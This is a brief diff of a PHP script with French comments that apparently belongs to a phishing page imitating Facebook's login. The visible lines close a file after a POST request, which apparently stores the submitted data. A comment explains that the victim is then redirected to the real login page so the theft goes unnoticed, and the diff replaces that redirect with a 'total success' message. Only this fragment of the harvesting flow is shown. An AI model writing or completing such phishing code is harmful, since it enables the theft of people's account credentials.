@@ -10,7 +10,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         fclose($file);
 
         // Rediriger l'utilisateur vers la vraie page de connexion
-        header("Location: http://facebook.com/login");
+        //header("Location: http://facebook.com/login");
         echo "C'était une Réussite Totale";
 	exit();
     } 
